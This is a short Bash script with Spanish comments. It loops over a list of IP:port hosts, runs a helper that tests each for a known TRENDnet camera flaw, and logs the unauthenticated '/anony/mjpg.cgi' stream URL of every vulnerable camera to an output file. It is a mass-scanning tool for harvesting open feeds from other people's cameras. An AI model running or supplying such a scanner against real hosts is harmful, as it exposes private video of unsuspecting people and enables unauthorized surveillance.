#!/bin/bash
# uso:
# exploit_check_list listadehosts ficherosalida

rm -rf $2
touch $2

total=$(cat $1 | wc -l)
counter=0

while read linea
do
   let counter=$counter+1
   ip=$(echo $linea | cut -d":" -f1)
   puerto=$(echo $linea | cut -d":" -f2)
 		echolog "[Exploit] [${counter}/${total}] Comprobando ${ip}:${puerto}"     		
		exploit_check_host ${ip} ${puerto} &> /dev/null
	   	resultado=$?
           	if [ $resultado -eq 0 ]
		then
		# trendnet-bug-check-ipandport devuelve 0 cuando detecta una camara vulnerable en la ip:puerto especificados
		# en caso contrario devuelve 1
              		echo 'http://'$ip':'$puerto'/anony/mjpg.cgi' >> $2
 			echolog '[Exploit] VULNERABLE: http://'$ip':'$puerto'/anony/mjpg.cgi' 
	   	fi
done < "$1"
if [ -f $2 ]; then
  total=$(cat $2 | wc -l) &> /dev/null
  echolog '[Exploit] Total vulnerables detectados:' $total
fi

